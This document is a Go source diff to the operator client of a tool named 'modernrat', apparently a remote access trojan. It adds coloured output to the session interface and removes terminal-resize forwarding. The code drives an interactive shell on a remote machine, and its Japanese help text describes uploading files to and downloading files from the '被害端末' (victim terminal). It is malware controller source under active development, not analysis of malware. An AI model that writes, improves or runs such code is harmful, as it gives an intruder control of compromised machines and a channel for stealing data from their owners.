@@ -12,7 +12,6 @@ import (
 	"sort"
 	"strings"
 	"sync"
-	"syscall"
 	"unicode"
 
 	pb "modernrat-client/gen"
@@ -123,7 +122,7 @@ func (s *adminSession) receiveLoop() error {
 
 			if !instructionsShown {
 				instructionsShown = true
-				fmt.Fprint(os.Stderr, "\r\n[local] 行頭で ':' を入力するとローカルコマンド (upload/download) を実行できます。\n")
+				fmt.Fprintf(os.Stderr, "\r\n%s 行頭で ':' を入力するとローカルコマンド (upload/download) を実行できます。\n", uiColors.wrap(uiColors.accent, "[local]"))
 			}
 
 		case pb.ShellMessageType_SHELL_MESSAGE_TYPE_STDOUT:
@@ -148,48 +147,6 @@ func (s *adminSession) receiveLoop() error {
 		}
 	}
 }
-
-func (s *adminSession) watchResize() {
-	if s.sessionID == "" {
-		return
-	}
-
-	s.sigCh = make(chan os.Signal, 1)
-	signal.Notify(s.sigCh, syscall.SIGWINCH)
-	defer func() {
-		signal.Stop(s.sigCh)
-		close(s.sigCh)
-	}()
-
-	sendSize := func() {
-		w, h, err := term.GetSize(int(os.Stdout.Fd()))
-		if err != nil || w <= 0 || h <= 0 {
-			return
-		}
-		_ = s.safeSend(&pb.ShellMessage{
-			Type:      pb.ShellMessageType_SHELL_MESSAGE_TYPE_RESIZE,
-			SessionId: s.sessionID,
-			UserId:    s.userID,
-			Cols:      int32(w),
-			Rows:      int32(h),
-		})
-	}
-
-	sendSize()
-
-	for {
-		select {
-		case <-s.ctx.Done():
-			return
-		case _, ok := <-s.sigCh:
-			if !ok {
-				return
-			}
-			sendSize()
-		}
-	}
-}
-
 func (s *adminSession) stdinLoop(sessionID string) error {
 	if sessionID == "" {
 		return errors.New("session id not initialized")
@@ -344,7 +301,7 @@ func (s *adminSession) stdinLoop(sessionID string) error {
 							return err
 						}
 						if err != nil {
-							fmt.Fprintf(os.Stderr, "ローカルコマンドエラー: %v\n", err)
+							fmt.Fprintf(os.Stderr, "%s %v\n", uiColors.wrap(uiColors.error, "ローカルコマンドエラー:"), err)
 						}
 					}
 					lineBuf = lineBuf[:0]
@@ -389,7 +346,7 @@ func (s *adminSession) stdinLoop(sessionID string) error {
 }
 
 func (s *adminSession) handleLocalCommandMode(sessionID string) error {
-	fmt.Fprint(os.Stdout, "\r\n[local mode] upload/download コマンドを使用できます。空行で終了します。\n")
+	fmt.Fprintf(os.Stdout, "\r\n%s upload/download コマンドを使用できます。空行で終了します。\n", uiColors.wrap(uiColors.accent, "[local mode]"))
 
 	wasRaw := s.rawMode
 	if wasRaw {
@@ -468,11 +425,11 @@ func (s *adminSession) handleLocalCommandMode(sessionID string) error {
 }
 
 func (s *adminSession) printLocalHelp() {
-	fmt.Println("利用可能なローカルコマンド:")
-	fmt.Println("  upload <local> [remote]  - ローカルファイルを被害端末へ送信")
-	fmt.Println("  download <remote> [local] - 被害端末からローカルに保存")
-	fmt.Println("  help                      - このヘルプを表示")
-	fmt.Println("  exit                      - ローカルモードを終了")
+	fmt.Println(uiColors.wrap(uiColors.accent, "利用可能なローカルコマンド:"))
+	fmt.Printf("  %-28s %s\n", uiColors.wrap(uiColors.accent, "upload <local> [remote]"), "ローカルファイルを被害端末へ送信")
+	fmt.Printf("  %-28s %s\n", uiColors.wrap(uiColors.accent, "download <remote> [local]"), "被害端末からローカルに保存")
+	fmt.Printf("  %-28s %s\n", uiColors.wrap(uiColors.accent, "help"), "このヘルプを表示")
+	fmt.Printf("  %-28s %s\n", uiColors.wrap(uiColors.accent, "exit"), "ローカルモードを終了")
 }
 
 func (s *adminSession) executeLocalCommand(line string) error {
@@ -504,11 +461,11 @@ func (s *adminSession) executeLocalCommand(line string) error {
 		if remotePath == "" {
 			remotePath = filepath.Base(localPath)
 		}
-		fmt.Fprintf(os.Stdout, "[local] uploading %s -> %s\n", localPath, remotePath)
+		fmt.Fprintf(os.Stdout, "%s uploading %s -> %s\n", uiColors.wrap(uiColors.accent, "[local]"), localPath, remotePath)
 		if err := s.app.performUpload(s.userID, localPath, remotePath); err != nil {
 			return err
 		}
-		fmt.Fprintln(os.Stdout, "[local] upload complete")
+		fmt.Fprintln(os.Stdout, uiColors.wrap(uiColors.success, "[local] upload complete"))
 
 	case "download":
 		if len(args) < 2 {
@@ -526,11 +483,11 @@ func (s *adminSession) executeLocalCommand(line string) error {
 		if err != nil {
 			return err
 		}
-		fmt.Fprintf(os.Stdout, "[local] downloading %s -> %s\n", remotePath, localPath)
+		fmt.Fprintf(os.Stdout, "%s downloading %s -> %s\n", uiColors.wrap(uiColors.accent, "[local]"), remotePath, localPath)
 		if err := s.app.performDownload(s.userID, remotePath, localPath); err != nil {
 			return err
 		}
-		fmt.Fprintln(os.Stdout, "[local] download complete")
+		fmt.Fprintln(os.Stdout, uiColors.wrap(uiColors.success, "[local] download complete"))
 
 	default:
 		return fmt.Errorf("未知のローカルコマンドです: %s", args[0])
